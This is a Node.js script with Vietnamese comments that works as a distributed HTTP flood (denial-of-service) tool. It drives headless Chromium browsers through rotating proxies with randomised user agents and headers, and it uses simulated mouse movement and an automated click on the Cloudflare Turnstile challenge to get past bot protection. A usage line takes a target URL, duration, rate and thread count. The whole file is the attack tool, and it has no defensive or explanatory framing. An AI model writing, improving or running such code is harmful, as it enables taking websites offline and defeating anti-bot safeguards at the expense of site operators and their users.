const fs = require('fs');
const { chromium } = require('playwright');
const { Worker, isMainThread, workerData, parentPort } = require('worker_threads');
const colors = require('colors');

// Đoc tham so tu dong lenh
const target = process.argv[2];
const duration = parseInt(process.argv[3]);
const rate = parseInt(process.argv[4]);
const threads = parseInt(process.argv[5]);
const proxyFile = process.argv[6];

if (!target || !duration || !rate || !threads || !proxyFile) {
    console.log("Usage: node tung.js <url> <time> <rate> <threads> <proxy.txt>");
    process.exit(1);
}

// Đoc proxy tu file
let proxies = fs.readFileSync(proxyFile, 'utf-8').split('\n').filter(Boolean);

// Cac User-Agent ngau nhien
const uaList = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)...',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...',
    'Mozilla/5.0 (X11; Linux x86_64)...'
    // Them nhieu User-Agent
];

// Cac header ngau nhien
const headersList = [
    { 'Accept-Language': 'en-US,en;q=0.9', 'Accept-Encoding': 'gzip, deflate, br' },
    { 'Accept-Language': 'vi-VN,vi;q=0.9', 'Accept-Encoding': 'gzip, deflate, br' },
    { 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate, br' }
];

// Ham log thong bao
function log(msg) {
    const now = new Date();
    const time = now.toTimeString().split(' ')[0];
    parentPort.postMessage(`(${time}) ${msg}`);
}

// Random proxy tu danh sach
function randomProxy() {
    return proxies[Math.floor(Math.random() * proxies.length)];
}

// Random User-Agent
function randomUA() {
    return uaList[Math.floor(Math.random() * uaList.length)];
}

// Random headers
function randomHeaders() {
    return headersList[Math.floor(Math.random() * headersList.length)];
}

// Ham di chuyen chuot ngau nhien
async function randomMouseMove(page) {
    for (let i = 0; i < 15; i++) {
        await page.mouse.move(Math.floor(Math.random() * 230), Math.floor(Math.random() * 230));
        await page.waitForTimeout(500);
    }
}

// Ham xu ly captcha va xac minh
async function captchaSolver(page, context, response) {
    await page.waitForTimeout(1000);
    for (let i = 0; i < 10; i++) {
        await page.mouse.move(Math.floor(Math.random() * 300), Math.floor(Math.random() * 300));
        await page.waitForTimeout(500);
    }

    const title = await page.title();
    if (title === "Just a moment...") {
        const captchaBox = page.locator('xpath=//*[@id="turnstile-wrapper"]/div');
        if (await captchaBox.count() > 0) {
            const rect = await captchaBox.boundingBox();
            if (rect) {
                const x = rect.x + rect.width / 2;
                const y = rect.y + rect.height / 2;
                await page.mouse.click(x, y);
                await page.waitForTimeout(8000);
            }
        } else {
            await page.waitForTimeout(15000);
        }
    }

    const cookies = (await context.cookies()).map(c => `${c.name}=${c.value}`).join('; ');
    const headers = await response.request().allHeaders();

    return { title: await page.title(), cookies, headers };
}

// Ham gui request va retry khi gap loi
async function sendRequest(proxy, ua, headers, retries = 3) {
    try {
        const browser = await chromium.launch({
            headless: true,
            proxy: { server: proxy }
        });

        const context = await browser.newContext({
            userAgent: ua,
            extraHTTPHeaders: headers
        });

        // Duy tri ket noi cho moi request
        const page = await context.newPage();
        const response = await page.goto(target, { timeout: 15000 });
        const result = await captchaSolver(page, context, response);

        log(`Success | Proxy: ${proxy} | Title: ${result.title}`);
        await browser.close();
    } catch (err) {
        if (retries > 0) {
            log(`Retrying | Proxy: ${proxy} | Error: ${err.message}`.yellow);
            await sendRequest(proxy, ua, headers, retries - 1);
        } else {
            log(`Failed | Proxy: ${proxy} | ${err.message}`.red);
        }
    }
}

// Ham xu ly tung thread
async function attackThread(id) {
    const startTime = Date.now();
    const endTime = startTime + duration * 1000;
    let sent = 0;

    // Cap nhat toc đo toi uu hon
    while (Date.now() < endTime && sent < rate) {
        const proxy = randomProxy();
        const ua = randomUA();
        const headers = randomHeaders();

        await sendRequest(proxy, ua, headers);
        sent++;
    }

    log(`Thread ${id} completed. Sent ${sent} requests.`.blue);
}

// Đoan ma chinh
if (isMainThread) {
    const workers = [];

    // Dung Worker Pool toi uu
    for (let i = 0; i < threads; i++) {
        const worker = new Worker(__filename, {
            workerData: {
                id: i + 1,
                target,
                duration,
                rate,
                proxies
            }
        });

        workers.push(worker);
        worker.on('message', (msg) => console.log(msg));
        worker.on('error', (err) => console.error(`Worker ${i + 1} error: ${err}`));
        worker.on('exit', (code) => {
            if (code !== 0) console.error(`Worker ${i + 1} exited with code ${code}`);
        });
    }

    // Đam bao rang tat ca workers đa hoan thanh
    await Promise.all(workers);
} else {
    attackThread(workerData.id);
}
